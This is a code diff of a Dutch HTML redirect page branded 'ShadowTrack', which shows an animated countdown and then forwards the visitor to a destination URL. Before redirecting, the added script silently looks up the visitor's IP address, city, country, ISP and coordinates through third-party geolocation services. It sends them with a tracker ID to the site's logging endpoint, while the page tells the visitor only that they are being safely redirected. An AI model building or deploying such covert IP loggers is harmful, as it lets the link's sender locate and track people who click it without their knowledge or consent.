@@ -2,24 +2,241 @@
 <html lang="nl">
 <head>
   <meta charset="UTF-8">
-  <title>Even geduld...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Doorsturen...</title>
   <style>
-    body { background:#0f0f0f; color:white; font-family:Arial; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
-    .loader { border:5px solid #333; border-top:5px solid #00ff88; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; }
-    @keyframes spin { to { transform:rotate(360deg); } }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #090917;
+      color: #fff;
+      display: flex;
+      min-height: 100vh;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    /* Subtiele achtergrondanimatie */
+    body::before {
+      content: '';
+      position: fixed;
+      inset: -50%;
+      background: radial-gradient(ellipse at 30% 40%, rgba(0,255,136,0.06) 0%, transparent 60%),
+                  radial-gradient(ellipse at 70% 60%, rgba(0,204,255,0.06) 0%, transparent 60%);
+      animation: pulse 6s ease-in-out infinite alternate;
+      pointer-events: none;
+    }
+
+    @keyframes pulse {
+      from { opacity: 0.6; transform: scale(1); }
+      to   { opacity: 1;   transform: scale(1.04); }
+    }
+
+    .card {
+      position: relative;
+      max-width: 460px;
+      width: calc(100% - 32px);
+      padding: 36px 32px;
+      border-radius: 24px;
+      background: rgba(10, 10, 30, 0.96);
+      box-shadow: 0 0 0 1px rgba(255,255,255,0.06), 0 32px 80px rgba(0,0,0,0.5);
+      text-align: center;
+      animation: slideUp 0.5s cubic-bezier(.22,1,.36,1) both;
+    }
+
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .logo {
+      font-size: 1.1rem;
+      font-weight: 700;
+      letter-spacing: 0.2em;
+      text-transform: uppercase;
+      color: #00ff88;
+      margin-bottom: 24px;
+      opacity: 0.9;
+    }
+
+    .countdown-ring {
+      position: relative;
+      width: 96px;
+      height: 96px;
+      margin: 0 auto 20px;
+    }
+
+    .countdown-ring svg {
+      transform: rotate(-90deg);
+    }
+
+    .countdown-ring circle {
+      fill: none;
+      stroke-width: 4;
+    }
+
+    .countdown-ring .track {
+      stroke: rgba(255,255,255,0.08);
+    }
+
+    .countdown-ring .progress {
+      stroke: #00ccff;
+      stroke-linecap: round;
+      stroke-dasharray: 251.2;
+      stroke-dashoffset: 0;
+      transition: stroke-dashoffset 1s linear;
+    }
+
+    .countdown-number {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2.4rem;
+      font-weight: 700;
+      color: #00ccff;
+    }
+
+    .message {
+      font-size: 1rem;
+      opacity: 0.75;
+      margin-bottom: 16px;
+      line-height: 1.5;
+    }
+
+    .destination {
+      font-size: 0.82rem;
+      color: rgba(255,255,255,0.4);
+      word-break: break-all;
+      padding: 10px 14px;
+      background: rgba(255,255,255,0.04);
+      border-radius: 10px;
+      border: 1px solid rgba(255,255,255,0.06);
+      margin-top: 8px;
+    }
+
+    .status {
+      margin-top: 18px;
+      font-size: 0.88rem;
+      color: rgba(255,255,255,0.45);
+    }
   </style>
 </head>
-<body>
-  <div style="text-align:center">
-    <div class="loader"></div>
-    <h2>Even geduld...</h2>
-    <p>Wordt doorgestuurd</p>
+<body data-destination-url="{{DESTINATION_URL}}" data-tracker-id="{{TRACKER_ID}}">
+  <div class="card">
+    <div class="logo">ShadowTrack</div>
+
+    <div class="countdown-ring">
+      <svg viewBox="0 0 96 96" width="96" height="96">
+        <circle class="track"    cx="48" cy="48" r="40"/>
+        <circle class="progress" cx="48" cy="48" r="40" id="progressRing"/>
+      </svg>
+      <div class="countdown-number" id="countdown">3</div>
+    </div>
+
+    <p class="message">Je wordt veilig doorgestuurd.</p>
+    <div class="destination" id="targetLink"></div>
+    <p class="status" id="status">Even geduld…</p>
   </div>
 
   <script>
-    setTimeout(() => {
-      window.location.href = "{{DESTINATION_URL}}";
-    }, 1200);
+    // Waarden worden door de server veilig in data-attributen geplaatst
+    const targetUrl = document.body.dataset.destinationUrl;
+    const trackerId = document.body.dataset.trackerId;
+
+    // Toon de bestemmings-URL op een veilige manier via textContent
+    document.getElementById('targetLink').textContent = targetUrl;
+
+    // SVG-cirkel animatie
+    const circumference = 2 * Math.PI * 40; // ≈ 251.2
+    const ring = document.getElementById('progressRing');
+    ring.style.strokeDasharray  = circumference;
+    ring.style.strokeDashoffset = 0;
+
+    async function fetchGeo() {
+      const endpoints = [
+        'https://ipapi.co/json/',
+        'https://ipwhois.app/json/'
+      ];
+
+      for (const url of endpoints) {
+        try {
+          const response = await fetch(url);
+          if (!response.ok) continue;
+
+          const data = await response.json();
+          if (data.ip) {
+            return {
+              ip:      data.ip,
+              country: data.country_name || data.country || 'Unknown',
+              city:    data.city || 'Unknown',
+              isp:     data.org || data.isp || 'Unknown',
+              lat:     data.latitude ?? data.lat ?? null,
+              lon:     data.longitude ?? data.lon ?? null
+            };
+          }
+        } catch (err) {
+          console.warn('Geo ophalen mislukt van', url, err);
+        }
+      }
+
+      return { ip: 'Unknown', country: 'Unknown', city: 'Unknown', isp: 'Unknown', lat: null, lon: null };
+    }
+
+    async function sendLog() {
+      const geo = await fetchGeo();
+      const payload = { tracker_id: trackerId, ...geo };
+
+      try {
+        await fetch('/api/log-geo', {
+          method:  'POST',
+          credentials: 'same-origin',
+          keepalive: true,
+          headers: { 'Content-Type': 'application/json' },
+          body:    JSON.stringify(payload)
+        });
+      } catch (err) {
+        console.warn('Log naar server mislukt met fetch:', err);
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon('/api/log-geo', new Blob([JSON.stringify(payload)], { type: 'application/json' }));
+        }
+      }
+    }
+
+    async function beginRedirect() {
+      await sendLog();
+
+      let countdown = 3;
+      const countdownEl = document.getElementById('countdown');
+      const statusEl    = document.getElementById('status');
+      const totalMs     = countdown * 1000;
+      const startTime   = Date.now();
+
+      const timer = setInterval(() => {
+        const elapsed  = Date.now() - startTime;
+        const fraction = Math.min(elapsed / totalMs, 1);
+        ring.style.strokeDashoffset = circumference * fraction;
+
+        countdown = Math.ceil(3 - elapsed / 1000);
+
+        if (elapsed >= totalMs) {
+          clearInterval(timer);
+          countdownEl.textContent   = '0';
+          statusEl.textContent      = 'Doorsturen…';
+          ring.style.strokeDashoffset = circumference;
+          window.location.replace(targetUrl);
+          return;
+        }
+
+        countdownEl.textContent = countdown;
+        statusEl.textContent    = `Doorsturen in ${countdown}…`;
+      }, 200);
+    }
+
+    beginRedirect();
   </script>
 </body>
 </html>
